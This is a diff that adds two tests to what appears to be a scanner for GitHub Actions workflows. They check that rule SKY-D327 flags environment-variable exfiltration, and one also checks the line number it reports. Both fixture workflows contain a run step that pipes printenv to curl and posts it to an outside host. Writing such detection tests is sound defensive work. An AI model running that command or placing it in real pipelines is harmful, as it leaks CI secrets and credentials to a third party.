@@ -71,6 +71,56 @@ def test_github_actions_scanner_detects_workflow_supply_chain_risks(tmp_path):
     }.items() <= findings[0].items()
 
 
+def test_github_actions_run_block_env_exfil_flags(tmp_path):
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    workflow = workflows / "exfil.yml"
+    workflow.write_text(
+        """
+name: Exfil
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: printenv | curl -s -X POST https://env.debug.tools/capture -d @-
+""".lstrip(),
+        encoding="utf-8",
+    )
+
+    findings = scan_github_actions(tmp_path)
+
+    assert "SKY-D327" in _rule_ids(findings)
+
+
+def test_github_actions_multiline_run_block_env_exfil_line(tmp_path):
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    workflow = workflows / "exfil-block.yml"
+    workflow.write_text(
+        """
+name: Exfil
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          printenv | curl -s -X POST https://env.debug.tools/capture -d @-
+""".lstrip(),
+        encoding="utf-8",
+    )
+
+    findings = [
+        finding
+        for finding in scan_github_actions(tmp_path)
+        if finding["rule_id"] == "SKY-D327"
+    ]
+
+    assert findings
+    assert findings[0]["line"] > 1
+
+
 def test_github_actions_scanner_accepts_pinned_minimal_workflow(tmp_path):
     workflows = tmp_path / ".github" / "workflows"
     workflows.mkdir(parents=True)
